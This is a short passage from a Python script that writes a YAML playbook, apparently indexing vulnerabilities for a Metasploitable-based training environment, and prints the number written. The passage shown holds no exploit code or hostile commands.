    (PLAYBOOKS / "gym_metasploitable.yaml").write_text(
        yaml.safe_dump(index_document(), sort_keys=False, allow_unicode=True),
        encoding="utf-8",
    )
    print(f"wrote {len(VULNERABILITIES)} vulnerabilities")


if __name__ == "__main__":
    write()
